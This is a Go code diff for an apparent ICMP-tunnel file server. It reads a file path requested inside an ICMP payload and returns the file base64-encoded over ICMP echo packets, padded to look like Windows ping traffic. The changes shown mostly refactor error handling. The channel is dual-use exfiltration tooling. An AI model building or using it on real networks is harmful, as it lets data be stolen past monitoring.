@@ -108,24 +108,33 @@ func main() {
 					*/
 
 					//Second Step is Checking if the requested file Exists and its size
+					windowsPayload := []byte("abcdefghijklmnopqrstuvwabcdefg") // 30 bytes
+
 					dir := string(StringDecodedBytes)[2:]
 					fmt.Printf(" -> Requested File Directory is %s.\n", dir)
 
 					fileBytes, err := os.ReadFile(dir)
+
+					var faMessage string
+
 					if err != nil {
 						log.Printf("Failed to read file: %v", err)
-						return
+						faMessage = "File not found"
+					} else {
+						encodedFile := base64.StdEncoding.EncodeToString(fileBytes)
+						fileSize := len(encodedFile)
+
+						fmt.Printf(" -> Requested File Found.\n")
+						fmt.Printf(" -> Requested File size is %d Bytes.\n", fileSize)
+
+						faMessage = strconv.Itoa(fileSize)
 					}
 
-					encodedFile := base64.StdEncoding.EncodeToString(fileBytes)
-
-					fileSize := len(encodedFile)
-
-					payloadBytes := []byte("FA" + strconv.Itoa(fileSize) + "FA")
-
-					// Third Step is Sending File Acknoledgement ICMP Request
-					windowsPayload := []byte("abcdefghijklmnopqrstuvwabcdefg") // 30 bytes
-					encodedFA := base64.StdEncoding.EncodeToString(append(payloadBytes, windowsPayload...))
+					// Build FA payload
+					payloadBytes := []byte("FA" + faMessage + "FA")
+					encodedFA := base64.StdEncoding.EncodeToString(
+						append(payloadBytes, windowsPayload...),
+					)
 
 					request := &icmp.Message{
 						Type: ipv4.ICMPTypeEcho,
@@ -139,24 +148,23 @@ func main() {
 
 					requestBytes, err := request.Marshal(nil)
 					if err != nil {
-						log.Printf("Failed to marshal FA request Bytes: %v", err)
+						log.Printf("Failed to marshal FA request: %v", err)
+						return
 					}
 
-					//Add some delay for the client to Open an interface and start listening
-
+					// Give the client time to start listening
 					delay := time.Duration(rand.Intn(1000)) * time.Millisecond
 					time.Sleep(delay)
 
-					// Sending File Acknoledgement ICMP Request
-					faDst1 := &net.IPAddr{IP: ip.SrcIP}
-					_, err = conn.WriteTo(requestBytes, faDst1)
+					// Send FA packet
+					faDst := &net.IPAddr{IP: ip.SrcIP}
+					_, err = conn.WriteTo(requestBytes, faDst)
 					if err != nil {
-						log.Printf("Failed to send File Acknoledgement ICMP request: %v", err)
-					} else {
-						fmt.Printf(" -> Requested File Found.\n")
-						fmt.Printf(" -> Requested File size is %s Bytes.\n", strconv.Itoa(int(fileSize)))
-						fmt.Printf(" -> File_Acknowlgement ICMP request sent to %s \n", allowedIP)
+						log.Printf("Failed to send File Acknowledgement ICMP request: %v", err)
+						return
 					}
+
+					fmt.Printf(" -> File Acknowledgement ICMP request sent to %s\n", allowedIP)
 
 				case strings.HasPrefix(StringDecodedBytes, "FP"):
 
@@ -215,7 +223,7 @@ func main() {
 						// Build payload: "FD" + chunk
 						payload := append([]byte(prefix), []byte(chunkData)...)
 
-						// Pad if needed to reach exact payload size
+						// Pad if needed to reach exact payload size (it breaks the client decoding) to be solved
 						//	if len(payload) < icmpPayloadSize {
 						//		padding := make([]byte, icmpPayloadSize-len(payload))
 						//		payload = append(payload, padding...)
